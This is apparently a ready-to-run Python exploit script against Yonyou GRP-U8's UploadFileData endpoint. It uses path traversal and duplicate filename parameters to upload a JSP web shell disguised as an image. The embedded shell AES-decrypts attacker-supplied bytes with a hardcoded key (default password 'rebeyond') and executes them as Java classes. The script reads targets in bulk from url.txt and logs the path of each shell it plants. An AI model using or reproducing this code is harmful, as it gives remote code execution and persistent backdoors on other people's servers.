# _*_ coding:utf-8 _*_
# @Time : 2023/7/25 22:33
import requests
 
def getResponse(target):
    if 'http' in target:
        final_target = target
    elif 'https' in target:
        final_target = target
    else:
        final_target  = "http://"+target
    url = final_target + '/UploadFileData?action=upload_file&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&foldername=..%2F&filename=666.jsp&filename=1.jpg'
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'close',
        'Upgrade-Insecure-Requests': '1',
    }
    files = {
        'myfile': ('test.jpg', ' <%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals("POST")){String k="e45e329feb5d925b";/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>', 'text/plain')
    }
    try:
        response = requests.post(url, headers=headers, files=files,timeout=3)
        result = final_target
        if response.status_code == 200 :
            if '此接口已停用' not in response.text:
                result = final_target +'/R9iPortal/666.jsp'
                print(f"\033[32m文件上传成功！存在漏洞, 访问路径:{result}\033[0m")
                #print("响应内容：", response.text)
 
                with open('用友-GRP-U8_result.txt',mode='a+',encoding='utf-8') as f2:
                    f2.write(result+'\n')
            else:
                print(f"\033[31m文件上传失败！访问路径:{result}\033[0m")
        else:
            print(f"\033[31m文件上传失败！访问路径:{result}\033[0m")
        #print("响应内容：", response.text)
    except Exception as e:
        print(e)
 
with open('url.txt',mode='r',encoding='utf-8') as f1:
    for line in f1.readlines():
        getResponse(line.strip())